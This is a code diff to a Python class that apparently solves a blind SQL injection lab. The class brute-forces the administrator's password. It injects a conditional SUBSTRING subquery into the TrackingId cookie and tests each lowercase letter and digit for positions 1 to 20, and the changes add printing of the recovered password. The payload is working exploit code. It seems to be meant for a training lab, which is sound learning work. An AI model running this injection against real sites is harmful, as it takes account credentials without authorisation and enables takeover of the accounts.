@@ -16,6 +16,7 @@ class BlindConditionalResponsesSolver(SQLInjectionBaseSolver):
         self.session = self.html_content.cookies.get('session')
         self.trackingId = self.html_content.cookies.get('TrackingId')
         self.password = ""
+        self.listChar = list(string.ascii_lowercase + string.digits)
 
         
 
@@ -28,11 +29,10 @@ class BlindConditionalResponsesSolver(SQLInjectionBaseSolver):
     
     def custom_payload(self):
         """Build the payload."""
-        listChar = list(string.ascii_lowercase + string.digits)
         self.spinner.start()
         self.spinner.text = 'Brute Force Password'
         for idx in range(1, 21):
-            for char in listChar:
+            for char in self.listChar:
                 cookies = {
                     'session': self.session,
                     'TrackingId': f"{self.trackingId}' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{char}"
@@ -47,7 +47,9 @@ class BlindConditionalResponsesSolver(SQLInjectionBaseSolver):
                     self.spinner.text = f"Password: {self.password}"
                     self.spinner.start()
                     break
-
+        
+        self.spinner.stop()
+        print(f"[bold blue]Password:[/bold blue] {self.password}")
         self.list_users = {"administrator": self.password}
 
     # def custom_payload(self):
